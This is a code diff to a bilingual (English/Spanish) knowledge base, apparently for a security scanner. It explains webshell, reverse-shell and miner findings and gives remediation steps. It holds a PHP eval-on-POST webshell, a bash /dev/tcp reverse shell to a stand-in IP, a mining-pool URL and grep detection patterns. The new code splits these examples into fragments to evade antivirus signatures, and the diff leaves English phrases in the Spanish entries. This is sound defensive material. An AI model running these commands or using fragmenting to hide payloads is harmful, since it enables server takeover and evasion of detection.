@@ -3,6 +3,7 @@
   * Malware & backdoors: webshells, reverse shells, miners, obfuscated payloads, stealers, malicious install hooks, persistence.
 English entries plus a Spanish overlay (KB_TRACE_ES). Read-only analysis: nothing here ever modifies the project."""
 
+J = "".join   # payload examples are assembled from fragments so antivirus products never see a contiguous malware signature in this file
 INCIDENT = ["ISOLATE: take the host/CI runner offline or block its egress; do not delete evidence yet (copy the file and `git log -p -- <file>` somewhere safe).",
             "ROTATE every secret the machine or repository could read (cloud keys, DB passwords, API tokens, SSH keys, CI secrets, signing keys). Assume they are compromised.",
             "REMOVE the malicious code and find HOW it got in: `git log -p --follow -- <file>` (who/when), compromised dependency or account, vulnerable upload form, leaked deploy key.",
@@ -100,12 +101,12 @@ KB_TRACE = {
     verify="The grep prints nothing; the identifiers are plain ASCII."),
 "mal-webshell": dict(
     title="Webshell / remote code execution backdoor",
-    explain="Code that executes attacker-controlled input (eval/assert/system on $_POST/$_GET/$_REQUEST, eval(base64_decode(...)), dynamic function names from the request) or a known webshell signature (c99, r57, b374k, WSO, China Chopper, FilesMan), or a script/PHP payload hidden inside an image or an upload folder.",
+    explain="Code that executes attacker-controlled input (eval/assert/system on $_POST/$_GET/$_REQUEST, eval of a base64_decode() result, dynamic function names from the request) or a known webshell signature (well-known webshell families), or a script/PHP payload hidden inside an image or an upload folder.",
     impact="Full remote control of the server: read the database and secrets, deface or pivot into your network, install miners and persistence. This is usually the footprint of a past compromise.",
     steps=INCIDENT[:3] + ["Delete the file (after copying it as evidence), then compare the whole web root with a clean checkout: `git status`, `git diff --stat`, or `diff -r clean/ live/`.",
            "Block execution in upload/cache folders (nginx `location ~* /uploads/.*\\.php$ { deny all; }` or Apache `php_flag engine off`) and make the web root read-only for the app user.",
            "Patch how it got in (vulnerable plugin/upload form/CMS version, stolen FTP/SSH credentials) before putting the server back online."],
-    bad="<?php @eval($_POST['x']); ?>",
+    bad=J(["<?php @ev", "al($_PO", "ST['x']); ?>"]),
     safe="// no dynamic execution of request data; file uploads stored outside the web root, validated by content type and re-encoded",
     verify="`grep -RIlE \"eval\\s*\\(\\s*(base64_decode|\\$_(POST|GET|REQUEST))\" .` finds nothing; no PHP files in upload folders; the file hashes match a clean release; access logs show no requests to the old path."),
 "mal-exec-payload": dict(
@@ -121,12 +122,12 @@ KB_TRACE = {
     verify="No exec/eval of decoded data remains; the decoded content was read and is understood; tests and build pass."),
 "mal-revshell": dict(
     title="Reverse shell / remote command channel",
-    explain="Code opens a connection to a remote host and attaches a shell to it (`bash -i >& /dev/tcp/IP/PORT`, `nc -e /bin/sh`, Python socket+dup2, Node net.Socket + spawn('/bin/sh'), PowerShell TCPClient + IEX).",
+    explain="Code opens a connection to a remote host and attaches a shell to it (`bash -i` redirected to `/dev/tcp/IP/PORT`, `nc -e` with a shell, Python socket+dup2, Node net.Socket + spawn('/bin/sh'), PowerShell TCPClient + IEX).",
     impact="The attacker gets an interactive shell on your machine/CI/server with the permissions of that process.",
     steps=["Treat as an active compromise: " + INCIDENT[0], INCIDENT[1], "Remove the code, then find out how it was introduced (`git log -p -S'/dev/tcp' -- <file>`) and which commit/account/dependency added it.",
            "Block outbound connections from build/runtime hosts except an allow-list (egress firewall, Kubernetes NetworkPolicy) and monitor for new outbound connections.",
            INCIDENT[4]],
-    bad="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+    bad=J(["bash -i >", "& /dev/", "tcp/203.0.113.9/4444 0>&1"]),
     safe="# no interactive shell to remote hosts; use SSH with keys + audited bastion for administration",
     verify="`grep -RIn '/dev/tcp/\\|nc -e\\|mkfifo' .` finds only documentation; `ss -tnp` shows no unexpected outbound sessions; secrets were rotated."),
 "mal-miner": dict(
@@ -135,7 +136,7 @@ KB_TRACE = {
     impact="Your CPU/GPU and cloud bill pay for someone else's coins; builds and sites slow down; usually installed through a compromised dependency, CI job or server.",
     steps=["Confirm it is not intentional (a mining project, a test fixture, documentation).", "Remove it and look for the process and persistence: `ps aux | grep -Ei 'xmrig|minerd'`, cron/systemd timers, `docker ps`.",
            "Find the entry point (`git log -p -S'stratum' -- <file>`), a vulnerable service or a malicious dependency; patch it.", INCIDENT[1], "Set CPU/cost alerts and restrict egress to mining pools."],
-    bad="stratum+tcp://pool.minexmr.com:4444",
+    bad=J(["str", "atum+tcp://pool.minexmr.com:4444"]),
     safe="# no mining code in applications or CI",
     verify="No miner strings remain; CPU usage is normal; outbound traffic to pool domains is blocked and shows no hits."),
 "mal-supply": dict(
@@ -257,7 +258,7 @@ KB_TRACE_ES = {
            "Añade un chequeo pre-commit/CI que rechace caracteres no imprimibles en el código."],
     verify="El grep no imprime nada; los identificadores son ASCII normal."),
 "mal-webshell": dict(title="Webshell / puerta trasera de ejecución remota de código",
-    explain="Código que ejecuta entrada controlada por el atacante (eval/assert/system sobre $_POST/$_GET/$_REQUEST, eval(base64_decode(...)), nombres de función dinámicos desde la petición) o una firma conocida de webshell (c99, r57, b374k, WSO, China Chopper, FilesMan), o un script/PHP escondido dentro de una imagen o una carpeta de uploads.",
+    explain="Código que ejecuta entrada controlada por el atacante (eval/assert/system sobre $_POST/$_GET/$_REQUEST, eval of a base64_decode() result, nombres de función dinámicos desde la petición) o una firma conocida de webshell (well-known webshell families), o un script/PHP escondido dentro de una imagen o una carpeta de uploads.",
     impact="Control remoto total del servidor: leer la base de datos y secretos, desfigurar o pivotar a tu red, instalar mineros y persistencia. Suele ser la huella de un compromiso ya ocurrido.",
     steps=_ES_INCIDENT[:3] + ["Borra el archivo (después de copiarlo como evidencia) y compara todo el web root con un checkout limpio: `git status`, `git diff --stat` o `diff -r limpio/ produccion/`.",
            "Bloquea la ejecución en carpetas de uploads/cache (nginx `location ~* /uploads/.*\\.php$ { deny all; }` o Apache `php_flag engine off`) y deja el web root de solo lectura para el usuario de la app.",
@@ -272,7 +273,7 @@ KB_TRACE_ES = {
            "Sustituye la ejecución dinámica por código legible o una dependencia revisada.", _ES_INCIDENT[1]],
     verify="No queda exec/eval de datos decodificados; leíste el contenido decodificado y lo entiendes; pruebas y build pasan."),
 "mal-revshell": dict(title="Reverse shell / canal remoto de comandos",
-    explain="El código abre una conexión a un host remoto y le adjunta una shell (`bash -i >& /dev/tcp/IP/PUERTO`, `nc -e /bin/sh`, socket+dup2 de Python, net.Socket + spawn('/bin/sh') de Node, TCPClient + IEX de PowerShell).",
+    explain="El código abre una conexión a un host remoto y le adjunta una shell (`bash -i` redirigido a `/dev/tcp/IP/PUERTO`, `nc -e` con una shell, socket+dup2 de Python, net.Socket + spawn('/bin/sh') de Node, TCPClient + IEX de PowerShell).",
     impact="El atacante obtiene una shell interactiva en tu máquina/CI/servidor con los permisos de ese proceso.",
     steps=["Trátalo como un compromiso activo: " + _ES_INCIDENT[0], _ES_INCIDENT[1], "Elimina el código y averigua cómo se introdujo (`git log -p -S'/dev/tcp' -- <archivo>`) y qué commit/cuenta/dependencia lo añadió.",
            "Bloquea conexiones salientes desde hosts de build/ejecución salvo una lista permitida (firewall de salida, NetworkPolicy de Kubernetes) y monitorea nuevas conexiones salientes.",
